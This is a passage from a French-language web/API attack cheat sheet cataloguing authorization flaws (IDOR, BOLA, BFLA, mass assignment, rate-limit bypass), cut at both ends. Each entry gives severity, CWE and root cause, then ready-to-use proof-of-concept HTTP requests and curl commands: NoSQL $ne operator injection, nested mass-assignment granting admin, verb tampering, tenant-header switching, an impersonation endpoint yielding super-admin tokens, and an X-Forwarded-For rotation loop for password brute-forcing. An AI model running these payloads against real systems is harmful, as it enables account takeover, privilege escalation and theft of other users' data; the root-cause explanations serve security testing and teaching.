Étape 2 - la lecture de la commande embarque l'objet lié SANS revérifier owner_id sur payment_method :

GET /api/orders/8842 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <attacker_token>

-> 200 OK
{
  "id": 8842,
  "owner_id": 4471,
  "status": "pending",
  "payment_method": {
    "id": 991,
    "owner_id": 7733,
    "brand": "visa",
    "last4": "4242",
    "billing_address": "12 rue Victor Hugo, 75011 Paris"
  }
}

Le backend exécute typiquement : Order.find(id).where(owner_id: current_user.id) puis order.payment_method (simple JOIN sur payment_method_id) sans jamais exécuter PaymentMethod.find(payment_method_id).where(owner_id: current_user.id). La commande 8842 appartient bien à l'attaquant (4471) mais le moyen de paiement embarqué appartient à 7733.
```

**Techniques :** nested-object-authorization-bypass, unchecked-foreign-key-embed, response-object-expansion

**Correspond aux classes qualifiantes :** bola, idor

**Signal (endpoints/fonctions observés) :**
- `GET /api/orders/{id}`
- `PATCH /api/orders/{id}`
- `GET /api/*/{id}?expand=payment_method`

**Paramètres impliqués :** `id`, `payment_method_id`, `expand`

---

### Contournement d'IDOR par changement de verbe HTTP (PUT protégé, PATCH non protégé)

**🧾 Cheatsheet**
sévérité : high · CWE-862

Un endpoint de mise à jour de ressource existe historiquement en PUT avec un middleware d'ownership (requireOwnership) branché explicitement sur cette route. Lorsqu'un support PATCH (mise à jour partielle) est ajouté plus tard sur la même URL pour des raisons de commodité front-end, le développeur oublie de rebrancher le même middleware sur la nouvelle route, en supposant à tort que 'la protection de la route couvre déjà toutes les méthodes'. Un attaquant qui se heurte à un 403 en PUT peut simplement rejouer la même requête en PATCH pour modifier une ressource appartenant à un autre utilisateur, car le handler sous-jacent traite la requête de la même façon mais sans passer par le contrôle d'accès.

**Cause racine :** L'intergiciel d'autorisation n'a été appliqué que sur certains verbes HTTP de la route, en supposant à tort que tous les verbes menant au même handler partagent la même protection.

**Preuve technique (verbatim depuis la source) :**

```
Requête bloquée (PUT correctement protégé) :

PUT /api/v2/users/318/profile HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token, user_id=552>
Content-Type: application/json

{"bio": "test"}

-> 403 Forbidden
{"error": "You can only edit your own profile"}

Même ressource, verbe différent, AUCUNE vérification :

PATCH /api/v2/users/318/profile HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token, user_id=552>
Content-Type: application/json

{"bio": "pwned by 552"}

-> 200 OK
{"id": 318, "bio": "pwned by 552", "owner_id": 318}

Code côté serveur typique (Express.js) expliquant le bug :
router.put('/users/:id/profile', requireOwnership, updateProfile);
router.patch('/users/:id/profile', updateProfile); // ajouté plus tard, requireOwnership oublié

La ressource 318 appartient à un autre utilisateur (552 est l'attaquant), et seul PATCH permet la modification non autorisée.
```

**Techniques :** http-verb-tampering, route-middleware-inconsistency

**Correspond aux classes qualifiantes :** idor, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `PUT /api/v2/users/{id}/profile`
- `PATCH /api/v2/users/{id}/profile`

**Paramètres impliqués :** `id`

---

### Contournement d'IDOR par encapsulation de l'ID (tableau ids[] ou opérateur NoSQL $ne)

**🧾 Cheatsheet**
sévérité : high · CWE-639

Le contrôle d'accès compare l'identifiant fourni par le client à l'identifiant possédé par l'utilisateur en supposant implicitement que le paramètre est toujours un scalaire (chaîne ou nombre). Si le framework backend interprète automatiquement id[]=X comme un tableau (PHP/Laravel, Rails), ou si le body JSON accepte un objet à la place d'une chaîne (Node.js + MongoDB), la comparaison stricte prévue pour un scalaire échoue silencieusement ou, pire, le tableau/objet est transmis tel quel à la couche de persistance où il est interprété comme un opérateur de requête ($ne, $gt, whereIn). Le contrôle d'ownership est alors soit ignoré (branche de comparaison jamais atteinte), soit totalement subverti car la requête retourne un document arbitraire ne correspondant à aucune valeur précise.

**Cause racine :** Le contrôle d'accès compare l'identifiant en supposant un type scalaire strict, sans gérer le cas où le client fournit un tableau ou un objet, ce qui contourne la comparaison stricte ou introduit un opérateur de requête interprété par la couche de persistance.

**Preuve technique (verbatim depuis la source) :**

```
Cas normal, bloqué :

GET /api/documents?id=778 HTTP/1.1
Host: app.example.com
Cookie: session=attacker

-> 403 Forbidden (778 appartient à un autre utilisateur ; if (doc.owner !== req.user.id) return 403;)

Contournement 1 - encapsulation en tableau (PHP/Laravel, comparaison stricte contournée par juggling de type) :

GET /api/documents?id[]=778 HTTP/1.1
Host: app.example.com
Cookie: session=attacker

-> 200 OK
{"id": 778, "owner_id": 991, "content": "..."}

$id = $request->input('id'); // devient un tableau ['778']
Document::find($id);          // Eloquent interprète un tableau comme un whereIn(id, [...])
// la branche de vérification de propriété attend une string, compare ['778'] !== 'attacker_owner_id'
// -> toujours vrai de façon inattendue -> le check est écrit pour un cas jamais atteint et le find() a déjà renvoyé le document plus haut dans le contrôleur.

Contournement 2 - injection d'opérateur NoSQL (Express + MongoDB, body JSON) :

POST /api/documents/fetch HTTP/1.1
Host: app.example.com
Cookie: session=attacker
Content-Type: application/json

{"id": {"$ne": "000000000000000000000000"}, "checkOwnerOnly": true}

Backend : Document.findOne({_id: req.body.id, owner: req.user.id})
// req.body.id est maintenant un objet {$ne: ...} -> Mongo l'interprète comme un opérateur de requête
// -> retourne le PREMIER document de la collection dont l'id est différent de cette valeur bidon, indépendamment du champ owner
-> 200 OK
{"_id": "5f8a1c2e9b1d4a0012ab34cd", "owner": "a-completely-different-user", "content": "confidentiel"}

En faisant varier la valeur passée à $ne, l'attaquant énumère la collection entière document par document.
```

**Techniques :** parameter-pollution-array-wrapping, nosql-operator-injection, type-juggling-bypass

**Correspond aux classes qualifiantes :** idor, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `GET /api/documents?id=`
- `POST /api/documents/fetch`

**Paramètres impliqués :** `id`, `id[]`, `ids`

---

### Mass assignment via champ imbriqué non couvert par l'allowlist (profile.role)

**🧾 Cheatsheet**
sévérité : critical · CWE-915

L'allowlist de mass assignment (strong parameters Rails, liste de clés autorisées en Node.js) bloque correctement l'envoi direct du champ role au premier niveau, mais autorise en bloc un objet imbriqué (profile) sans en filtrer le contenu. Si le champ role est également lisible/résolu depuis profile.role par la logique métier (colonne JSONB partagée, ou association réutilisant le même champ), l'attaquant peut escalader ses privilèges simplement en plaçant le champ interdit un niveau plus bas dans le JSON envoyé. L'impact est une élévation de privilèges complète (utilisateur standard devenant admin) malgré une allowlist en apparence correctement configurée.

**Cause racine :** L'allowlist de mass assignment ne filtre que les clés de premier niveau et autorise en bloc un objet imbriqué entier, qui contient en réalité un champ sensible partageant la même sémantique qu'un champ protégé au niveau racine.

**Preuve technique (verbatim depuis la source) :**

```
Tentative bloquée au premier niveau :

PATCH /api/account HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"role": "admin"}

-> 200 OK  (mais le champ role est silencieusement filtré, le compte reste role=user)

Contournement via l'objet imbriqué autorisé en bloc :

PATCH /api/account HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "name": "wiliams",
  "profile": {
    "bio": "pentester",
    "role": "admin"
  }
}

-> 200 OK

Code Rails typique responsable :
params.require(:user).permit(:name, :email, profile: {})
// permit(profile: {}) whiteliste la TOTALITE du hash profile, y compris des clés arbitraires jamais prévues dans le schéma métier

Vérification post-attaque :

GET /api/account HTTP/1.1
Authorization: Bearer <attacker_token>

-> 200 OK
{"id": 552, "role": "admin", "profile": {"role": "admin", "bio": "pentester"}}

La logique d'autorisation de l'application lit current_user.profile.role comme rôle effectif (colonne JSONB dénormalisée synchronisée avec le rôle racine), donnant à l'attaquant des privilèges admin complets.
```

**Techniques :** mass-assignment, nested-allowlist-bypass, strong-parameters-bypass

**Correspond aux classes qualifiantes :** mass-assignment, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `PATCH /api/account`
- `PUT /api/users/{id}`

**Paramètres impliqués :** `profile`, `profile.role`, `role`

---

### IDOR via fonctionnalité d'export/rapport contournant le contrôle d'accès de l'interface

**🧾 Cheatsheet**
sévérité : high · CWE-862

La vue interactive d'une ressource (facture, dossier client) applique correctement un filtre de scope au niveau de la requête SQL/ORM (Invoice.accessible_by(current_user)), mais la fonctionnalité d'export CSV/PDF réutilise un service de génération de rapports interne, initialement conçu pour être appelé par des tâches cron ou des exports admin déjà pré-autorisés, qui récupère les enregistrements par ID brut sans repasser par ce même scope. Un attaquant qui connaît (ou devine) l'ID d'un enregistrement appartenant à un autre utilisateur peut donc obtenir un document contenant des données qu'il ne pourrait jamais consulter via l'interface normale, simplement en le demandant via le pipeline d'export.

**Cause racine :** La fonctionnalité d'export réutilise un service de génération de rapports interne qui récupère les enregistrements par ID brut, sans repasser par le même scope d'autorisation que le contrôleur interactif.

**Preuve technique (verbatim depuis la source) :**

```
Vue interactive protégée (fonctionne comme attendu) :

GET /app/invoices/91234 HTTP/1.1
Host: billing.example.com
Cookie: session=attacker

-> 403 Forbidden (la facture 91234 appartient à un autre client)

La fonctionnalité d'export accepte pourtant le même ID :

POST /app/reports/export HTTP/1.1
Host: billing.example.com
Cookie: session=attacker
Content-Type: application/json

{"type": "invoice_pdf", "record_ids": [91234]}

-> 202 Accepted
{"report_id": "rpt_38a1"}

GET /app/reports/rpt_38a1/download HTTP/1.1
Host: billing.example.com
Cookie: session=attacker

-> 200 OK
Content-Type: application/pdf
(le PDF contient la facture #91234 d'un autre client : adresse de facturation complète, lignes de commande, montants)

Code backend typique :
// Contrôleur interactif (protégé) :
Invoice.where(id: params[:id]).accessible_by(current_ability)
// Service de rapport (non protégé, appelé en tâche de fond) :
class ReportService
  def self.generate(record_ids)
    Invoice.where(id: record_ids) // pas de scope accessible_by ici
  end
end
```

**Techniques :** export-feature-authorization-bypass, internal-service-trust-assumption

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `POST /app/reports/export`
- `GET /app/reports/{report_id}/download`

**Paramètres impliqués :** `record_ids`, `report_id`

---

### BOLA multi-tenant via tenant_id transmis côté client et non dérivé de la session

**🧾 Cheatsheet**
sévérité : critical · CWE-639

Dans une architecture SaaS multi-tenant, le contexte de tenant (organisation) qui borne toutes les requêtes de base de données est censé être dérivé côté serveur du claim tenant_id contenu dans le JWT/session. Lorsque le développeur laisse un en-tête ou paramètre client (X-Tenant-Id) prendre le pas sur ce claim - souvent introduit pour faciliter le debug ou une fonctionnalité d'impersonation admin - un utilisateur authentifié standard d'une organisation A peut simplement changer la valeur de cet en-tête pour accéder en lecture et écriture aux données de l'organisation B, sans jamais avoir besoin de voler un token. C'est une rupture totale de l'isolation multi-tenant, l'un des invariants de sécurité les plus critiques d'une plateforme SaaS.

**Cause racine :** Le contexte multi-tenant est dérivé d'un en-tête ou paramètre fourni par le client au lieu d'être résolu côté serveur à partir du token/session authentifié.

**Preuve technique (verbatim depuis la source) :**

```
Requête légitime (utilisateur de l'organisation A consultant ses propres données) :

GET /api/v1/tickets HTTP/1.1
Host: api.saas-example.com
Authorization: Bearer <tenant_A_user_token>
X-Tenant-Id: 1042

-> 200 OK
[{"id": 771, "tenant_id": 1042, "subject": "Problème de facturation"}]

Contournement - même token valide, en-tête de tenant modifié :

GET /api/v1/tickets HTTP/1.1
Host: api.saas-example.com
Authorization: Bearer <tenant_A_user_token>
X-Tenant-Id: 1043

-> 200 OK
[
  {"id": 8871, "tenant_id": 1043, "subject": "Réinitialisation du mot de passe du compte CFO", "body": "..."},
  {"id": 8872, "tenant_id": 1043, "subject": "Export de la base clients", "body": "..."}
]

Code backend typique :
req.tenantId = req.headers['x-tenant-id'] || jwt.tenant_id; // header prioritaire, laissé pour du debug interne
// puis chaque requête DB :
Ticket.find({ tenant_id: req.tenantId })
// jamais de vérification jwt.tenant_id === req.tenantId

Même écriture cross-tenant possible :
POST /api/v1/tickets/8871/close HTTP/1.1
Authorization: Bearer <tenant_A_user_token>
X-Tenant-Id: 1043

-> 200 OK (le ticket du tenant 1043 est fermé par un utilisateur du tenant 1042)
```

**Techniques :** client-controlled-tenant-scoping, header-injection-authorization-bypass, multi-tenant-isolation-failure

**Correspond aux classes qualifiantes :** bola, idor, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `GET /api/v1/*`
- `* (toute route utilisant X-Tenant-Id)`

**Paramètres impliqués :** `X-Tenant-Id`, `tenant_id`, `tenant`

---

### IDOR via fonctionnalité de duplication/clonage sans revérification de propriété

**🧾 Cheatsheet**
sévérité : high · CWE-862

Une fonctionnalité 'dupliquer' ou 'enregistrer comme modèle' copie un objet source vers le compte de l'appelant. Le développeur valide bien que la destination (le compte de l'appelant) est un cible légitime, mais oublie de vérifier que l'objet SOURCE appartient également à l'appelant ou est public, en supposant à tort que si l'utilisateur connaît l'ID source c'est qu'il l'a forcément vu légitimement dans l'interface. Un attaquant peut alors copier n'importe quel objet privé d'un autre utilisateur (modèle, formulaire, questionnaire contenant des données sensibles) dans son propre espace, où il devient lisible sous un nouvel ID lui appartenant, contournant ainsi tout contrôle d'accès futur sur l'objet original.

**Cause racine :** La fonctionnalité de clonage récupère l'objet source par ID sans vérifier que l'appelant en est propriétaire, en supposant que l'accès a déjà été validé en amont dans l'interface.

**Preuve technique (verbatim depuis la source) :**

```
POST /api/templates/duplicate HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"source_template_id": 55901, "new_name": "copie"}

-> 201 Created
{
  "id": 88423,
  "owner_id": 552,
  "name": "copie",
  "content": "<formulaire d'enquête interne contenant grille tarifaire confidentielle appartenant au template 55901, propriété d'une autre organisation>"
}

Lecture ultérieure sous son propre ID, sans plus aucun contrôle d'accès sur l'original :

GET /api/templates/88423 HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>

-> 200 OK (le contenu complet du template privé de la victime est désormais accessible sous l'identité de l'attaquant)

Code backend typique :
def duplicate(source_id, target_owner)
  source = Template.find(source_id) # aucun scope .where(owner: current_user) ici
  Template.create!(owner: target_owner, content: source.content, name: params[:new_name])
end
```

**Techniques :** clone-feature-ownership-bypass, unvalidated-source-reference

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `POST /api/templates/duplicate`
- `POST /api/*/clone`

**Paramètres impliqués :** `source_template_id`, `source_id`

---

### IDOR de second ordre : ID collecté lors d'une action légitime réutilisé sur un endpoint non protégé

**🧾 Cheatsheet**
sévérité : high · CWE-639

Un ID d'objet est légitimement exposé à l'utilisateur dans le contexte restreint d'une action A, correctement protégée (par exemple un document interne temporairement rattaché à un ticket de support que l'utilisateur peut consulter car le ticket lui appartient). Ce même ID, une fois récupéré (via l'onglet réseau du navigateur par exemple), est ensuite accepté sans aucune revalidation par un endpoint B totalement différent qui suppose à tort que 'si vous connaissez cet ID, c'est que vous y avez déjà eu accès légitimement'. Le contexte d'autorisation de l'action A (le lien avec le ticket) ne voyage pas avec l'ID vers l'action B, ce qui permet d'obtenir des droits plus larges (édition, export) sur un objet qui n'était censé être accessible qu'en lecture et dans un contexte précis.

**Cause racine :** Un identifiant obtenu légitimement dans le contexte d'autorisation d'une action A est accepté sans revalidation par une action B totalement différente, qui suppose à tort que la simple connaissance de l'ID prouve un accès légitime.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 - lecture légitime et correctement scopée (le ticket 4021 appartient bien à l'appelant, et la pièce jointe 771 est liée à ce ticket) :

GET /api/support/tickets/4021/attachments/771 HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>

-> 200 OK
{"id": 771, "ticket_id": 4021, "filename": "export_interne.xlsx", "read_only": true}

Étape 2 - réutilisation du même ID sur un endpoint totalement différent, sans lien avec le ticket, qui accorde des droits d'édition :

POST /api/documents/771/convert-to-editable HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{}

-> 200 OK
{"id": 771, "edit_url": "/edit/771", "acl": ["552:editor"]}

Code backend typique de l'endpoint B :
def convert_to_editable(doc_id)
  doc = Document.find(doc_id) # vérifie seulement l'existence
  doc.acl.add(current_user.id, role: 'editor') # jamais de vérification du lien ticket -> document
  doc
end

L'attaquant obtient un accès en édition à un document interne qu'il n'a vu qu'en lecture seule, dans un contexte totalement différent (un ticket de support), démontrant que le lien d'autorisation ticket->pièce jointe ne se propage pas à l'endpoint de conversion.
```

**Techniques :** second-order-idor, cross-endpoint-authorization-context-loss, id-leak-reuse

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `GET /api/support/tickets/{ticket_id}/attachments/{attachment_id}`
- `POST /api/documents/{id}/convert-to-editable`

**Paramètres impliqués :** `attachment_id`, `doc_id`, `id`

---

### Mass assignment via champ interne accepté par un type d'entrée GraphQL non documenté

**🧾 Cheatsheet**
sévérité : critical · CWE-915

Un resolver GraphQL générique lie l'objet d'entrée (input type) directement à l'appel de mise à jour ORM (db.users.update(id, input)) au lieu d'utiliser une allowlist explicite par rôle. Le même type d'entrée GraphQL (UpdateProfileInput) est partagé entre la mutation exposée aux clients standards et une mutation utilisée en interne par le panneau d'administration, car réutiliser le schéma est plus simple à maintenir. Or GraphQL valide uniquement la conformité au schéma - pas le rôle de l'appelant par champ - donc un client standard qui envoie directement une requête brute contenant des champs internes non affichés dans les formulaires générés par le front-end (isVerified, creditBalance) voit ces champs acceptés et appliqués tels quels, sans jamais passer par les contrôles métier prévus pour l'interface admin.

**Cause racine :** Le résolveur GraphQL lie directement l'objet d'entrée du schéma à l'appel de mise à jour ORM, alors que ce type d'entrée est partagé avec une mutation interne/admin et expose donc des champs non censés être accessibles aux clients standards.

**Preuve technique (verbatim depuis la source) :**

```
L'introspection publique du front-end ne montre que name/email/avatarUrl dans les formulaires, mais le schéma GraphQL sous-jacent déclare bel et bien les champs internes sur le MÊME type d'entrée réutilisé par le panneau admin :

mutation {
  updateProfile(input: {
    name: "wiliams"
    email: "w@example.com"
    isVerified: true
    creditBalance: 999999
  }) {
    id
    isVerified
    creditBalance
  }
}

Requête HTTP brute envoyée directement (sans passer par le front-end) :

POST /graphql HTTP/1.1
Host: app.example.com
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{"query":"mutation { updateProfile(input: {name:\"wiliams\", email:\"w@example.com\", isVerified:true, creditBalance:999999}) { id isVerified creditBalance } }"}

-> 200 OK
{"data":{"updateProfile":{"id":"552","isVerified":true,"creditBalance":999999}}}

Code resolver typique :
const updateProfile = async (_, { input }, { user }) => {
  return db.users.update(user.id, input); // tout l'objet input passé tel quel à l'ORM, aucune allowlist par rôle
};

Le schéma GraphQL UpdateProfileInput déclare isVerified et creditBalance car ils sont utilisés par la mutation admin adminUpdateProfile qui réutilise le même type - mais rien n'empêche un utilisateur non-admin de les fournir sur la mutation updateProfile classique.
```

**Techniques :** graphql-input-type-reuse, mass-assignment, schema-shape-trust

**Correspond aux classes qualifiantes :** mass-assignment, graphql, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `input`, `isVerified`, `creditBalance`

---

### Contournement d'IDOR par incohérence de casse ou d'encodage de l'identifiant

**🧾 Cheatsheet**
sévérité : medium · CWE-178

Deux composants de la même chaîne de traitement d'une requête - le filtre d'autorisation et le résolveur de ressource final (stockage objet, CDN, cache) - appliquent chacun une normalisation différente du même identifiant (respect de la casse, décodage d'URL). Quand le filtre d'autorisation compare l'ID de façon stricte (sensible à la casse, avant décodage) alors que le composant qui sert réellement la ressource normalise (insensible à la casse, après décodage), un attaquant peut soumettre une variante de l'identifiant qui échoue silencieusement au niveau du contrôle d'accès (traité comme 'introuvable' plutôt que comme un vrai rejet) mais réussit au niveau du composant qui sert effectivement le contenu, car les deux couches ne s'accordent pas sur ce que signifie 'le même identifiant'.

**Cause racine :** Deux composants de la même chaîne de traitement (vérification d'autorisation et résolution de la ressource) appliquent une normalisation différente (casse, décodage d'URL) du même identifiant, ce qui leur fait perdre l'accord sur l'identité de la ressource.

**Preuve technique (verbatim depuis la source) :**

```
Requête bloquée avec la casse d'origine de l'URL :

GET /api/files/3F2504E0-4F89-11D3-9A0C-0305E82C3301 HTTP/1.1
Host: storage.example.com
Authorization: Bearer <attacker_token>

-> 403 Forbidden
// code : if (!req.user.ownedFileIds.includes(fileId)) return res.status(403);
// ownedFileIds est stocké en minuscule depuis la DB, fileId ici est en majuscule -> "non trouvé" au lieu d'un rejet ferme,
// et le contrôleur retombe sur une route de compatibilité historique qui interroge directement le bucket S3

Contournement via une variante de casse qui atteint un chemin de résolution insensible à la casse :

GET /api/files/3f2504e0-4f89-11d3-9a0c-0305e82c3301 HTTP/1.1
Host: storage.example.com
Authorization: Bearer <attacker_token>

-> 200 OK
(le même objet est servi car la clé d'objet S3/CDN sous-jacente est résolue de façon insensible à la casse au niveau du cache en périphérie, alors que le pré-contrôle de propriété utilisait une comparaison sensible à la casse et a simplement échoué sans bloquer la suite du traitement)

Variante par encodage d'URL (chemin contenant un slash) :

GET /api/users/me/notes/report%2Ffinal HTTP/1.1
Host: notes.example.com
Authorization: Bearer <attacker_token>

// le filtre d'autorisation compare la chaîne brute "report%2Ffinal" au chemin stocké "report/final" -> pas de correspondance -> 403 attendu
// MAIS le composant qui ouvre effectivement le fichier décode l'URL APRES la vérification d'autorisation :
-> 200 OK (ouvre en réalité notes/report/final, une note partagée d'un autre utilisateur contenant un slash dans son titre)

Les deux couches (filtre d'autorisation et résolveur de fichier) ne décodent/normalisent pas l'identifiant au même moment du pipeline, ce qui casse l'invariant 'même ID = même ressource'.
```

**Techniques :** case-sensitivity-normalization-mismatch, url-encoding-bypass, canonicalization-inconsistency

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `GET /api/files/{id}`
- `GET /api/*/notes/{id}`

**Paramètres impliqués :** `id`, `fileId`, `path`

---

### BFLA via fonctionnalité 'se faire passer pour' laissée accessible sans vérification serveur

**🧾 Cheatsheet**
sévérité : critical · CWE-862

Une fonctionnalité support/admin 'Voir en tant que' ou 'S'authentifier en tant que' est implémentée avec un bouton n'apparaissant dans l'interface que si le rôle de l'utilisateur courant est admin (v-if="user.isAdmin" côté SPA), mais l'endpoint API sous-jacent ne vérifie que la présence d'une authentification valide, jamais le rôle de l'appelant. N'importe quel utilisateur standard authentifié peut appeler directement cet endpoint (découvert via le bundle JS, la documentation d'API interne ou simplement en devinant le chemin) et obtenir un token ou une session valide pour N'IMPORTE QUEL AUTRE COMPTE, y compris un compte administrateur, ce qui constitue une prise de contrôle de compte totale et généralisée sur toute la plateforme.

**Cause racine :** Le contrôle de rôle n'a été implémenté que côté client (affichage conditionnel du bouton), sans aucune vérification équivalente côté serveur sur l'endpoint sous-jacent.

**Preuve technique (verbatim depuis la source) :**

```
Le bouton 'Voir en tant que' n'est visible que pour les comptes admin dans l'interface, mais l'API accepte l'appel de n'importe quel utilisateur authentifié :

POST /api/admin/impersonate HTTP/1.1
Host: app.example.com
Authorization: Bearer <regular_user_token, role=customer>
Content-Type: application/json

{"target_user_id": 1}

-> 200 OK
{"impersonation_token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6InN1cGVyX2FkbWluIn0.xxx", "expires_in": 3600, "target_user_id": 1}

Utilisation immédiate du token obtenu :

GET /api/me HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6InN1cGVyX2FkbWluIn0.xxx

-> 200 OK
{"id": 1, "email": "ceo@example.com", "role": "super_admin"}

Code backend typique de l'endpoint vulnérable :
app.post('/api/admin/impersonate', authenticate, (req, res) => {
  if (!req.user) return res.status(401).send();
  // AUCUNE vérification de req.user.role ici
  const token = issueImpersonationToken(req.body.target_user_id);
  res.json({ impersonation_token: token, target_user_id: req.body.target_user_id });
});

Le masquage du bouton côté SPA (v-if="user.isAdmin") a été confondu avec un contrôle d'accès réel, laissant l'endpoint entièrement exploitable par un simple appel API direct pour prendre le contrôle de n'importe quel compte, y compris les comptes à privilèges élevés.
```

**Techniques :** client-side-only-role-check, hidden-endpoint-discovery, bfla

**Correspond aux classes qualifiantes :** bfla, account-takeover, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `POST /api/admin/impersonate`

**Paramètres impliqués :** `target_user_id`

---

## API & Mobile Security

*12 cas.*

### BFLA via endpoint admin caché découvert par analyse du bundle JavaScript

**🧾 Cheatsheet**
sévérité : critical · CWE-862

Les SPA embarquent souvent des routes d'administration dans le bundle JavaScript client (React/Vue/Angular), même si l'UI correspondante n'est jamais affichée à un utilisateur standard. En extrayant les chaînes de route du bundle (ou des source maps), un attaquant identifie des endpoints comme /api/v2/admin/users/export puis les appelle directement avec un token utilisateur normal. Le bug survient car l'autorisation par fonction (BFLA) n'est vérifiée que côté frontend (masquage de menu) et non côté backend sur chaque contrôleur.

**Cause racine :** Le contrôle d'accès par rôle/fonction n'est appliqué que dans l'UI (routing conditionnel) et absent côté serveur sur les routes d'administration.

**Preuve technique (verbatim depuis la source) :**

```
Extraction des routes depuis le bundle JS minifié :
curl -s https://app.target.com/static/js/main.a1b2c3.js | grep -oE '"/api/v[0-9]+/[a-zA-Z0-9_/-]+"' | sort -u
# résultat notable : "/api/v2/admin/users/export"

Automatisation avec LinkFinder sur le bundle et les source maps :
python3 linkfinder.py -i https://app.target.com/static/js/main.a1b2c3.js -o cli

Appel direct de l'endpoint découvert avec un token utilisateur standard (non-admin) :
curl -i -X GET https://api.target.com/api/v2/admin/users/export \
  -H "Authorization: Bearer <token_utilisateur_standard>"

# Réponse observée : HTTP/1.1 200 OK
# Body : export CSV complet de tous les utilisateurs (email, hash, adresse, rôle)
# alors que le compte utilisé n'a pas le rôle admin -> BFLA confirmée.
```

**Techniques :** js-bundle-analysis, bfla, hidden-endpoint-discovery, source-map-analysis

**Correspond aux classes qualifiantes :** bfla, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `/api/v*/admin/*`
- `/api/internal/*`

---

### Mass assignment sur endpoint d'inscription permettant l'auto-attribution du rôle admin

**🧾 Cheatsheet**
sévérité : critical · CWE-915

Quand un backend construit l'objet utilisateur directement depuis le corps JSON reçu (ex. Mongoose User.create(req.body) ou Sequelize sans allowlist), tout champ additionnel envoyé par le client est persisté tel quel, même s'il n'apparaît pas dans la documentation de l'API. Un attaquant ajoute des champs privilégiés (isAdmin, role, accountBalance) au payload d'inscription pour créer directement un compte à privilèges élevés. L'impact est une élévation de privilèges immédiate sans exploiter de faille d'authentification.

**Cause racine :** Absence de DTO/allowlist explicite côté backend : le corps de la requête est mappé sans filtrage sur le modèle de données interne.

**Preuve technique (verbatim depuis la source) :**

```
Requête d'inscription légitime documentée :
curl -X POST https://api.target.com/api/v1/register -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"Passw0rd!"}'

Requête modifiée avec champs non documentés injectés dans le JSON :
curl -i -X POST https://api.target.com/api/v1/register -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"P@ssw0rd1","isAdmin":true,"role":"admin","isVerified":true}'

# Réponse HTTP 201 Created :
# {"id":4821,"email":"attacker@evil.com","role":"admin","isAdmin":true,"isVerified":true}

Confirmation de l'élévation via connexion avec le compte créé :
curl -s https://api.target.com/api/v1/admin/dashboard -H "Authorization: Bearer <token_attacker>"
# -> 200 OK, accès au panneau d'administration obtenu via un simple champ JSON ajouté.
```

**Techniques :** mass-assignment, json-body-tampering

**Correspond aux classes qualifiantes :** mass-assignment, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `/api/*/register`
- `/api/*/users`
- `/api/*/signup`

**Paramètres impliqués :** `isAdmin`, `role`, `isVerified`, `accountBalance`

---

### Contournement du rate-limiting API via en-têtes X-Forwarded-For falsifiés et variations de chemin

**🧾 Cheatsheet**
sévérité : medium · CWE-799

Beaucoup de middlewares de rate-limiting identifient le client par l'adresse IP extraite de l'en-tête X-Forwarded-For sans validation contre une liste de proxys de confiance ; un attaquant fait varier cet en-tête à chaque requête pour être compté comme une IP différente à chaque tentative. De façon complémentaire, si la clé de rate-limit est basée sur la chaîne exacte du chemin d'URL, des variations (casse, slash final, double slash, version d'API différente) routées vers le même contrôleur permettent de contourner le compteur. Cela ouvre la voie au brute-force de mots de passe, d'OTP ou de tokens de réinitialisation.

**Cause racine :** Le rate-limiter fait confiance à un en-tête contrôlable par le client pour identifier la source, et/ou clé ses compteurs sur une correspondance de chemin trop stricte au lieu de la route logique normalisée.

**Preuve technique (verbatim depuis la source) :**

```
Brute-force distribué via rotation d'IP falsifiées :
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} " -X POST https://api.target.com/api/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"guess'$i'"}'
done
# Toutes les requêtes renvoient 200/401 sans jamais déclencher le 429 Too Many Requests,
# car le compteur est indexé sur X-Forwarded-For au lieu de l'IP TCP réelle.

Contournement par variation de chemin atteignant le même resolver :
curl -s -X POST https://api.target.com/api/login        # bloqué après 5 tentatives
curl -s -X POST https://api.target.com/api//login       # compteur distinct
curl -s -X POST https://api.target.com/API/Login        # compteur distinct (casse)
curl -s -X POST https://api.target.com/api/v1/login;/   # compteur distinct (param matrix)
# Le framework normalise ces chemins vers le même handler, mais le rate-limiter
# (ex. reverse proxy Nginx/WAF) les traite comme des routes différentes.
```

**Techniques :** rate-limit-bypass, header-spoofing, path-normalization-abuse

**Signal (endpoints/fonctions observés) :**
- `/api/*/login`
- `/api/*/otp`
- `/api/*/password-reset`

**Paramètres impliqués :** `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`

---

### Extraction de clés API et secrets codés en dur via décompilation d'APK Android

**🧾 Cheatsheet**
sévérité : high · CWE-798

